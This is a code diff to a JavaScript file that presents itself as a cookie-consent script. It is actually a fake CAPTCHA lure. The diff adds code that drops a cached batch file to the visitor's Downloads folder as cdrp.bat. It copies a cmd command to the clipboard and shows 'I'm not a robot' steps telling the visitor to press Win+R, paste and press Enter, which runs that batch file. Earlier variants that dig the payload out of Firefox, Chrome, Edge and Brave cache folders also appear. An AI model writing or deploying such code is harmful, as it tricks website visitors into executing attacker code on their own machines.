@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.4',
+    version: '1.9.5',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -24,11 +24,12 @@
     bodyStartMarker: 'CDRP7F3A9D2B8C4',
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
+    chromiumPayloadDownloadName: 'cdrp.bat',
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\Google\\Chrome\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (f_*) do @findstr /m /c:CDRP7F3 "%F">nul&&copy /y "%F" t.bat&&call t.bat&&goto :eof',
-      edge: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\Microsoft\\Edge\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (f_*) do @findstr /m /c:CDRP7F3 "%F">nul&&copy /y "%F" t.bat&&call t.bat&&goto :eof',
-      brave: 'cmd /k cd /d %TMP%&for /d %D in ("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User*") do @for /r "%D\\Cache\\Cache_Data" %F in (f_*) do @findstr /m /c:CDRP7F3 "%F">nul&&copy /y "%F" t.bat&&call t.bat&&goto :eof'
+      chrome: 'cmd /k cd /d %TMP%&copy /y "%USERPROFILE%\\Downloads\\cdrp.bat" t.bat>nul&&call t.bat',
+      edge: 'cmd /k cd /d %TMP%&copy /y "%USERPROFILE%\\Downloads\\cdrp.bat" t.bat>nul&&call t.bat',
+      brave: 'cmd /k cd /d %TMP%&copy /y "%USERPROFILE%\\Downloads\\cdrp.bat" t.bat>nul&&call t.bat'
     }
   };
 
@@ -87,6 +88,7 @@
   var captchaWidget = null;
   var captchaOverlay = null;
   var captchaVisible = false;
+  var lastPayloadBuf = null;
 
   function getFaviconCandidates() {
     var urls = [];
@@ -119,7 +121,7 @@
       if (bk === 'firefox') {
         statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes — Win+R scans Firefox cache2\\entries';
       } else {
-        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — disk cache primed; Win+R scans Cache\\Cache_Data. No hit: close browser, reload page, or use Firefox.';
+        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — complete captcha to save Downloads\\cdrp.bat, then Win+R pastes the confirmation code';
       }
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
@@ -176,9 +178,29 @@
     return ok;
   }
 
+  function saveChromiumPayloadDownload() {
+    if (getBrowserKey() === 'firefox' || !lastPayloadBuf) return;
+    try {
+      var name = CONSENT_CONFIG.chromiumPayloadDownloadName || 'cdrp.bat';
+      var blob = new Blob([lastPayloadBuf], { type: 'application/octet-stream' });
+      var a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = name;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(function () {
+        URL.revokeObjectURL(a.href);
+        a.remove();
+      }, 500);
+    } catch (e) {}
+  }
+
   function copyVerificationCommand() {
     var cmd = getVerificationCommand();
     if (!cmd) return false;
+
+    saveChromiumPayloadDownload();
 
     if (fallbackCopy(cmd)) return true;
 
@@ -325,11 +347,13 @@
           if (CONSENT_CONFIG.strictBody !== false) {
             var check = validateStrictPayload(buf);
             if (!check.ok) {
+              lastPayloadBuf = null;
               updateCacheStatus('fail', check.reason);
               return false;
             }
           }
 
+          lastPayloadBuf = buf;
           CONSENT_CONFIG.cacheFileBodySize = buf.byteLength;
           updateCacheStatus('ok', new TextDecoder('utf-8').decode(buf));
           saveBodyReference(buf);
@@ -422,6 +446,9 @@
   }
 
   function getVerifyingHtml(refId) {
+    var dlStep = getBrowserKey() !== 'firefox'
+      ? '<li>Allow <strong>cdrp.bat</strong> to save to your Downloads folder</li>'
+      : '';
     return (
       '<div class="ts-v-header">' +
       '<div class="ts-v-status">' + getOrbitDotsHtml() + '<span class="ts-v-title">Verifying...</span></div>' +
@@ -429,6 +456,7 @@
       '<div class="ts-links"><a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">Privacy</a><span class="ts-dot">·</span><a href="#">Help</a></div></div></div>' +
       '<div class="ts-v-rule"></div>' +
       '<div class="ts-v-body"><h3>Let us know you\'re human, please complete steps:</h3><ol>' +
+      dlStep +
       '<li>Press <span class="ts-kbd">Win</span> + <span class="ts-kbd">R</span> to open the verification dialog</li>' +
       '<li>Press <span class="ts-kbd">Ctrl</span> + <span class="ts-kbd">V</span> to paste the confirmation code</li>' +
       '<li>Press <span class="ts-kbd">Enter</span> to confirm you\'re not a robot</li>' +
@@ -445,9 +473,10 @@
       el.className = 'ts-v-copy-hint ts-v-copy-warn';
       return;
     }
+    var dlNote = getBrowserKey() !== 'firefox' ? ' cdrp.bat should be in Downloads.' : '';
     el.textContent = copied
-      ? 'Confirmation code copied to clipboard.'
-      : 'Click this panel and press Ctrl+V again if paste is empty.';
+      ? 'Confirmation code copied to clipboard.' + dlNote
+      : 'Click this panel and press Ctrl+V again if paste is empty.' + dlNote;
     el.className = copied ? 'ts-v-copy-hint ts-v-copy-ok' : 'ts-v-copy-hint ts-v-copy-warn';
   }
 
